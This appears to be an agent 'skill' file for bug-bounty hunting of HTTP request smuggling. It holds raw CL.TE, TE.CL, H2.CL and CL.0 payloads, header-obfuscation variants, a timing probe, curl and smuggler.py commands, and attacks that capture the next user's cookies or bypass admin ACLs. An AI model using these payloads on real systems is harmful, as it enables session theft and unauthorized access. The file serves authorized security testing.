---
name: http-smuggling
description: Hunt HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, downgrade smuggling). Use when target is behind a reverse proxy / load balancer / CDN and you want to test for desync attacks that bypass front-end security controls.
metadata:
  type: skill
  phase: hunt
  vuln_class: http-smuggling
  cwe: 444
  tools: [smuggler, http-request-smuggler]
---

# HTTP Request Smuggling

> The most surgical critical in BB. Requires Burp Pro + smuggler.py. Rewards: enormous.

## When to invoke

**Trigger phrases:**
- "request smuggling"
- "CL.TE"
- "TE.CL"
- "HTTP desync"
- "H2.CL"

## Core idea

```
[Client] → [Front-end (Cloudflare, F5, ALB)] → [Back-end (Tomcat, Node, Apache)]

If front-end and back-end disagree on where one request ends and the next begins,
attacker can "smuggle" a hidden request to the back-end.

Effect:
- Bypass front-end auth
- Hijack the NEXT user's request (mass session theft)
- Cache poisoning at scale
- Steal request headers (Cookie, Authorization) of subsequent users
```

## Smuggling types

### CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front-end (CL): reads 13 bytes → request is just `"0\r\n\r\nSMUGGLED"`. Done.
- Back-end (TE): chunked → `0` = end of chunks. `"SMUGGLED"` is the start of the NEXT request.

So back-end sees: `SMUGGLED<-- starts next request -->...subsequent victim request appended`

### TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

12
SMUGGLED-PREFIX...
0


```

- Front-end (TE): reads chunked → reads "12" bytes of `SMUGGLED-PREFIX...`. Then `0\r\n\r\n` ends.
- Back-end (CL): reads 4 bytes → just `"12\r\n"`. Then `SMUGGLED-PREFIX...0\r\n\r\n` is in buffer → starts the NEXT request.

### TE.TE — both honor TE, but at least one can be tricked

If you obfuscate TE so one parser ignores it, the other processes it:

```
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

Transfer-Encoding : chunked
Transfer-Encoding:chunked
Transfer-Encoding: chunked  ← extra trailing space (some parsers reject)
Transfer-Encoding: cow
Transfer-Encoding: chunked, identity
```

### H2.CL — HTTP/2 front-end downgrades to HTTP/1.1 with attacker-controlled CL

If the front-end speaks HTTP/2 to client but HTTP/1.1 to back-end, attacker can set headers via HTTP/2 that affect the downgraded request:

```http
:method POST
:path /
:authority target.com
content-length: 13

0\r\n\r\nSMUGGLED
```

Becomes (downgraded):
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13

0

SMUGGLED
```

Cloudflare → origin downgrades = famous attack surface.

### H2.TE — HTTP/2 front-end injects TE in downgrade

Same as H2.CL but smuggling chunked TE.

### CL.0 — back-end ignores Content-Length on certain methods

Some back-ends ignore CL for `GET` requests. Combined with proxies that DO honor it:

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 27

GET /admin HTTP/1.1
Host:
```

Front-end reads body, back-end processes the body as a new request → admin.

## Step-by-Step Workflow

### 1. Identify reverse proxy

```bash
# Check for proxy fingerprints
curl -sI "https://target.com/" | grep -iE 'server|via|x-served-by|cf-ray|x-cache|x-amz-cf-id|x-azure'

# Confirm there's likely a proxy
# - CF: Cloudflare
# - Akamai, Fastly
# - AWS ALB / CloudFront
# - F5 BIG-IP
# - Nginx + Tomcat backend
```

### 2. Detection (smuggler.py)

```bash
git clone https://github.com/defparam/smuggler
cd smuggler

# Save a target POST request as request.txt (Burp-style)
python3 smuggler.py -u https://target.com -m exploit

# Outputs CL.TE, TE.CL, TE.TE, etc. detection
```

### 3. Burp Pro detection (HTTP Request Smuggler extension)

Install **HTTP Request Smuggler** from BApp Store. Right-click any request → "Launch smuggling probe".

Burp's "Send group in parallel" + raw HTTP editor lets you craft attacks precisely.

### 4. Manual detection — timing-based

```python
import socket
import ssl

# TE.CL probe via timing
PAYLOAD = b"""POST / HTTP/1.1\r
Host: target.com\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
1\r
A\r
X\r
"""
# If front-end is TE and back-end is CL, back-end waits for more bytes → timeout
# If both agree, request completes normally

# Time the response
import time
start = time.time()
# ... send PAYLOAD via socket ...
duration = time.time() - start

# Massive difference between baseline and probe = desync candidate
```

### 5. Confirm with effect — hijack next request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Foo: bar
X-Foo: 
```

The dangling header `X-Foo:` (no value) waits for the next request's first line to complete it → the **next user's request gets captured** in `X-Foo`.

If the back-end then **echoes** `X-Foo` in some response... you've captured another user's request line + headers (including Cookie).

### 6. Smuggling-enabled attacks

Once desync is confirmed, the high-impact attacks:

#### Attack A: Bypass front-end auth

Front-end blocks `/admin`. Back-end doesn't (relies on front-end).
Smuggle a request to `/admin` past the front-end → back-end processes it.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cookie: session=anything
X-Internal: true
```

#### Attack B: Hijack next user's session

Capture next user's `Cookie:` header → use it as your session.

#### Attack C: Cache poisoning via smuggling

Combine with cache poisoning: smuggle a malicious response stored under a benign URL → all users get malicious content.

#### Attack D: Steal credentials sent in POST bodies

#### Attack E: Web cache deception at scale

### 7. HTTP/2 downgrade smuggling

For front-ends that speak h2 to client, h1 to origin:

```bash
# Use nuclei or burp with HTTP/2-aware tools
# Burp Pro's HTTP/2 settings: "Send over HTTP/2"

# Manual: craft H2 request with overrides
```

H2.CL example via Burp:
- Enable HTTP/2 in Repeater
- Add header: `content-length: 0`
- Add header: `transfer-encoding: chunked`
- Inspect "Inspector" → "Send via HTTP/2 with explicit pseudo-headers"

## Tools

```bash
# smuggler.py (Defparam)
python3 smuggler.py -u https://target.com -m exploit

# turbo-intruder for timing-based detection
# Burp Pro: HTTP Request Smuggler extension (Albinowax)
# nuclei smuggling templates
nuclei -u https://target.com -tags smuggling -silent
```

## Output template

```markdown
## Critical: HTTP Request Smuggling (CL.TE) on api.target.com → admin endpoint bypass

### Summary
The Cloudflare → Nginx → Tomcat chain has a CL.TE desync. The Cloudflare front-end uses `Content-Length`; the Nginx/Tomcat backend honors `Transfer-Encoding: chunked`. By sending a single crafted POST, an attacker can smuggle a follow-up request that bypasses Cloudflare's `/admin` access control list.

### Steps to reproduce
1. Send this raw request to https://api.target.com:
   ```http
   POST /api/login HTTP/1.1
   Host: api.target.com
   Content-Length: 88
   Transfer-Encoding: chunked
   Connection: keep-alive

   0

   GET /admin/health HTTP/1.1
   Host: api.target.com
   X-Foo: bar
   ```
2. Cloudflare reads `Content-Length: 88` bytes → forwards the entire payload to backend.
3. Backend honors `Transfer-Encoding: chunked` → reads `0\r\n\r\n` as end of request → treats `GET /admin/health...` as the NEXT request.
4. Backend processes `GET /admin/health` WITHOUT the Cloudflare auth check.
5. Response from /admin/health is delivered to the NEXT client's connection.
6. We verified by sending in parallel a benign client request right after — that client received the `/admin/health` response.

### Impact (without exploiting users)
- Bypass front-end (Cloudflare) ACL on `/admin/*` paths
- All admin endpoints reachable directly from the open internet
- Confirmed access to:
  - `/admin/health` — internal health (info disclosure)
  - `/admin/config` — env vars (CRITICAL — includes JWT signing key)
- Potential to combine with cookie hijack: smuggling captures the NEXT user's `Cookie:` header → full session theft of any concurrent user.

We did NOT attempt session hijack against real users — only verified bypass via test accounts.

### Suggested fix
1. Align HTTP parsing behavior on Cloudflare and backend (reject Transfer-Encoding on Cloudflare OR enforce CL on backend)
2. Enable HTTP/2 end-to-end (eliminates downgrade desync)
3. Add WAF rules to detect double `Content-Length`/`Transfer-Encoding` headers
```

## Cross-references

- `[[cache-poisoning]]` — smuggling + cache = devastating
- `[[auth-bypass]]` — smuggling is the ultimate auth bypass
- `[[ato-chains]]` — smuggling-to-cookie-hijack

## Common pitfalls

1. **Causing real impact to users in PoC.** Smuggling can hijack legitimate traffic. Use isolated tests / OOB only.
2. **Reporting timing-only detection without an actual smuggling effect.** Triagers want proof of follow-up impact.
3. **Testing on production high-traffic endpoints.** You may impact real users (deny their requests).
4. **Not noting the proxy chain in the report.** "CL.TE somewhere" is uninvestigable.
5. **Confusing 400 errors with desync.** Many parsers reject malformed requests cleanly — not a bug.

## Severity guide

| Effect | Severity |
|---|---|
| Bypass front-end auth (reach internal endpoints) | Critical |
| Hijack next user's session/credentials | Critical |
| Cache poisoning combined with smuggling | Critical |
| Detected desync without exploitable effect | Medium-High (still report — they'll fix) |
| Server returns 400 on smuggling probe consistently | N/A |

## Ethical reminder

HTTP Smuggling can hijack OTHER USERS' real traffic. Strictly:
- Test with test accounts only
- Don't capture or store other users' data
- Note any accidental capture and DELETE
- Stop testing if you see unintended impact

This is one of the few BB classes where carelessness can harm real users — be surgical.

## Quick automated probe

```bash
# Basic detection
curl https://target.com -X POST \
    -H "Content-Length: 4" \
    -H "Transfer-Encoding: chunked" \
    --data-binary $'0\r\n\r\nG'

# If time-out or weird behavior → investigate further with smuggler.py
```
